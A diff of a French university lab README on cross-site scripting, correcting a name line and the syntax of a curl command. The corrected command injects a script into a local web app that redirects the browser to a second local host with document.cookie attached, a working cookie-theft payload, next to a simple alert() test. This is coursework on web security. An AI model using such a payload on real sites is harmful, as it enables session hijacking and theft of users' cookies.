@@ -2,7 +2,7 @@
 
 ## Binome
 
-Nom, Prénom, email: KROL Mikolaï mikolai.krol.etu@univ-lille.fr
+Nom, Prénom, email: KROL Mikolaï mikolai.krol.etu@univ-lille.fr  
 Nom, Prénom, email: HOLVOET Adrien adrien.holvoet.etu@univ-lile.fr
 
 
@@ -49,7 +49,7 @@ curl -d 'chaine=<script>alert("hello")</script>'  http://localhost:8080;
 
 * Commande curl pour lire les cookies
 ```
-curl -d 'chaine=<script>window.location.replace "localhost:4000/search?cookie=" + document.cookie</script>'  http://localhost:8080;
+curl -d 'chaine=<script>window.location.replace("localhost:4000/search?cookie=" + document.cookie)</script>'  http://localhost:8080;
 ```
 
 ## Question 6
